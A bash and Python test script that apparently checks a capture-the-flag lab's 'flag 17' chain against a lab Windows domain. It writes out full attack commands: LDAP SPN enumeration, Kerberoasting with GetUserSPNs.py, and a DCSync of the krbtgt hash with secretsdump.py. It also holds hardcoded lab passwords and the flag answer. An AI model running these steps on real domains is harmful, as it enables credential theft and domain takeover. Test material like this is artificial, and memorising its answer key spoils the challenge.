#!/bin/bash
# Chain test: Flag 17 — Full Kerberoast → DCSync → DA share
#
# This is the same as the A2 flag 17 test but framed as a chain:
# A0 employee info → password guessing → A2 Kerberoast → crack → DCSync → flag
#
# Requires: Windows DC at $A2_HOST, A0 website on $A0_PORT

set -e

A2_HOST="${A2_HOST:-10.100.0.4}"
A0_HOST="${A0_HOST:-127.0.0.1}"
A0_PORT="${A0_PORT:-8082}"
A2_ADMIN_PASS="${A2_ADMIN_PASS:-CTFAdmin2026!}"

smbclient -L "//${A2_HOST}" -U "BOREAS\\Administrator%${A2_ADMIN_PASS}" 2>&1 | grep -q "NETLOGON" || exit 77
curl -sf "http://${A0_HOST}:${A0_PORT}/" > /dev/null 2>&1 || exit 77

python3 << 'PYEOF'
import sys, os, subprocess, requests

A2_HOST = os.environ.get("A2_HOST", "10.100.0.4")
A0_HOST = os.environ.get("A0_HOST", "127.0.0.1")
A0_PORT = os.environ.get("A0_PORT", "8082")
ADMIN_PASS = os.environ.get("A2_ADMIN_PASS", "CTFAdmin2026!")
errors = []

def check(name, cond, detail=""):
    if not cond:
        errors.append(f"FAIL: {name} — {detail}")
        print(f"  FAIL: {name} — {detail}", file=sys.stderr)

# Step 1: Discover employee names from A0 website
r = requests.get(f"http://{A0_HOST}:{A0_PORT}/leadership")
check("A0 lists employee names", "Harlan" in r.text and "Vasik" in r.text)

# Step 2: Discover SPNs via LDAP (using a discovered account)
result = subprocess.run(
    ["ldapsearch", "-x", "-H", f"ldap://{A2_HOST}",
     "-b", "DC=boreas,DC=local",
     "-D", "svc-backup@boreas.local", "-w", "Password1",
     "(servicePrincipalName=*)", "sAMAccountName", "servicePrincipalName"],
    capture_output=True, text=True
)
check("SPN enumeration works", "MSSQLSvc" in result.stdout or "HTTP" in result.stdout)

# Step 3: Kerberoast
result = subprocess.run(
    ["GetUserSPNs.py", f"BOREAS.LOCAL/svc-backup:Password1", "-dc-ip", A2_HOST, "-request"],
    capture_output=True, text=True
)
check("Kerberoast extracts hash", "$krb5tgs$" in result.stdout)

# Step 4: DCSync (svc-backup has misconfigured replication rights)
result = subprocess.run(
    ["secretsdump.py", f"BOREAS.LOCAL/svc-backup:Password1@{A2_HOST}", "-just-dc-user", "krbtgt"],
    capture_output=True, text=True
)
check("DCSync extracts krbtgt", "krbtgt:" in result.stdout)

# Step 5: Access flag
result = subprocess.run(
    ["smbclient", f"//{A2_HOST}/admin_flag", "-U", f"BOREAS\\Administrator%{ADMIN_PASS}",
     "-c", "get flag.txt /tmp/chain17_flag.txt"],
    capture_output=True, text=True
)
if os.path.isfile("/tmp/chain17_flag.txt"):
    with open("/tmp/chain17_flag.txt") as f:
        check("flag 17 from DA share", "FLAG{6c0a9d4e7f2b8135}" in f.read())
    os.unlink("/tmp/chain17_flag.txt")
else:
    check("flag 17 share accessible", False, f"err: {result.stderr[:100]}")

if errors:
    for e in errors: print(f"  {e}", file=sys.stderr)
    sys.exit(1)
PYEOF
